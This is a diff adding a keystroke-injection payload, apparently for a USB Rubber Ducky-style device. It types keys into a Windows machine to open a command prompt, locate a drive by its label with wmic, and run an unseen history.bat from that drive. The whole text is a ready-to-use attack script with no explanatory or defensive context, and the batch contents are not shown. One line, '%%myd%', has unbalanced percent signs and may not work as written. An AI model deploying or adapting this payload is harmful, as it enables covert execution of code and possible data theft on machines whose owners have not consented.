@@ -1,0 +1,15 @@
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 100
+ENTER
+DELAY 100
+STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "_"') do set myd=%d
+DELAY 100
+ENTER
+STRING %%myd%\history.bat
+DELAY 100
+ENTER
+
